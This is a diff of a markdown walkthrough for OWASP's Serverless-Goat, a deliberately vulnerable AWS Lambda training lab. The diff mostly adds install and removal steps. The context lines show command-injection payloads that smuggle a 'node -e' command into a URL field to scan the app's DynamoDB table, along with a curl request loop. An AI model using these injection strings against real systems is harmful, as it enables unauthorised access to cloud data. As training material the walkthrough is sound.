@@ -1,6 +1,17 @@
 # serverless-goat Walkthrough
+written by MetalMandalore   
 
-*Still to add **INSTALL/REMOVAL** steps*
+Original OWASP written documentation on serverless-goat can be found here:  
+http://github.com/OWASP/Serverless-Goat
+After being inspired by the essentially free training for a serverless lambda function I created this walkthrough.    
+
+**Note this requires the setup of a free-tier Amazon AWS account**
+During my usage of serverless-goat I encountered 0 charges to my free-tier Amazon AWS account, however; small charges could be encurred anytime Amazon AWS is used. Just a forewarning since my understanding of Amazon AWS is still relatively small, there's a lot to that beasty.  
+
+## Installation 
+1. Access the AWS Serverless Application Repository   
+https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:761130837472:applications~serverless-goat
+
 
 ## Lambda Function API
 1. Locate the Endpoint URL under CloudFormation Outputs
@@ -79,12 +90,12 @@ Attempt to access content/information using Node.js
 `https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`
 2. Can the database be scanned?  
 `https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
-3. Can the database be queried?
-4. Does GetItem work?
-5. Does PutItem work?
-6. Does UpdateItem work?
-??? Do I enumerate all the things? Can I automate this?
-7. Can the s3 buckets be scanned?
+3. Potential further questions to be answered by node.js if you're a guru:  
+      * Can the database be queried?
+      * Does GetItem work?
+      * Does PutItem work?
+      * Does UpdateItem work?
+      * Can the s3 buckets be scanned?
 
 #### Profile Enumeration
 1. Using the information found in the env variables create a user profile 
@@ -149,4 +160,19 @@ for i in {1.100}; do
   curl -L <http-address>  
 done
 ```
+
+## Removing Serverless-goat
+1. Login to the AWS Console
+2. Navigate to Services
+3. Navigate to Cloudformation
+4. Click on the name of the Stack link
+5. Click Delete
+
+### If Delete Fails
+You may retain resources that are failing to delete
+1. Select Bucket as the resource to retain
+2. Click Delete
+3. Navigate to Services 
+4. Navigate to S3
+5. Select the S3 bucket and delete
 
